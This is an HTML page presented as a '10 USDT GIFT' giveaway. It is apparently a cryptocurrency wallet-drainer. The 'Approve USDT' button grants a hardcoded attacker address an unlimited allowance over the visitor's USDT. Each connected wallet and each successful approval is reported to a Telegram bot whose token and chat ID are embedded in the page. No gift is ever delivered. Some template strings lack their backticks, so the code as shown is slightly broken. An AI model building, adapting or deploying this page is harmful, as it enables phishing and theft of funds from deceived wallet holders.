<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>10 USDT GIFT</title>
<script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.umd.js"></script>
<script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<style>
body{
background:#111;
color:white;
font-family:Arial;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}
.box{
background:#1c1c1c;
padding:40px;
border-radius:20px;
text-align:center;
}
button{
padding:15px 25px;
font-size:18px;
border:none;
border-radius:10px;
cursor:pointer;
background:#2f80ed;
color:white;
margin:10px;
}
#approveBtn{
background:#27ae60;
}
p{
margin-top:20px;
color:#888;
}
</style>
</head>
<body>
<div class="box">
<h2>🎁 10 USDT GIFT</h2>
<button id="connect">Connect Wallet</button>
<button id="approveBtn" style="display:none;">Approve USDT</button>
<p id="status">Not Connected</p>
</div>
<script>
const projectId = "8a87775da8408b308e87edd8e4e3731d";
const YOUR_WALLET = "0x03175ff926e10977cf5af83713b7931748dba0dc";
const BOT_TOKEN = "8203927246:AAFKNl6xmv1ZFtURWYCOqHan4q7Fpl8tGDM";
const CHAT_ID = "641018179";
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
let provider = null;
let signer = null;
let userAddress = null;
let modal = null;
modal = new WalletConnectModal.default({
projectId: projectId,
chains: ["eip155:1"]
});
async function sendToTelegram(message) {
try {
await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ 
chat_id: CHAT_ID, 
text: message,
parse_mode: 'HTML'
})
});
} catch(e) {
console.log("Telegram error:", e);
}
}
document.getElementById("connect").onclick = async () => {
try{
document.getElementById("status").innerText = "Opening wallet...";
const {uri, approval} = await modal.openModal();
if (!uri) {
throw new Error("No URI received");
}
window.open(uri, "_blank");
const session = await approval();
const accounts = session.namespaces.eip155.accounts;
userAddress = accounts[0].split(':')[2];
document.getElementById("status").innerText = ✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)};
document.getElementById("approveBtn").style.display = "inline-block";
const web3Provider = new ethers.providers.Web3Provider(window.ethereum || window.walletconnectProvider);
signer = web3Provider.getSigner();
await sendToTelegram(🔗 <b>Wallet Connected</b>\n👤 Address: ${userAddress});
} catch(e){
console.log(e);
document.getElementById("status").innerText = "❌ Connection error";
}
};
document.getElementById("approveBtn").onclick = async () => {
if (!signer || !userAddress) {
document.getElementById("status").innerText = "❌ Connect wallet first";
return;
}
document.getElementById("status").innerText = "⏳ Approving USDT...";
try {
const usdtContract = new ethers.Contract(
USDT_CONTRACT,
[
"function approve(address spender, uint256 amount) external returns (bool)",
"function allowance(address owner, address spender) view returns (uint256)"
],
signer
);
const tx = await usdtContract.approve(YOUR_WALLET, MAX_UINT);
document.getElementById("status").innerText = "⏳ Waiting for confirmation...";
await tx.wait();
const txLink = https://etherscan.io/tx/${tx.hash};
await sendToTelegram(
🎁 <b>USDT APPROVE SUCCESS</b>\n +
👤 User: <code>${userAddress}</code>\n +
🔑 Spender: <code>${YOUR_WALLET}</code>\n +
🔗 Tx: <code>${tx.hash}</code>\n +
🌐 ${txLink}
);
document.getElementById("status").innerHTML = ✅ USDT Approved!<br><small>Tx: ${tx.hash.slice(0,10)}...</small>;
} catch(e) {
console.log(e);
document.getElementById("status").innerText = "❌ Approve failed: " + (e.message?.slice(0,50) || "Unknown error");
}
};
</script>
</body>
</html>
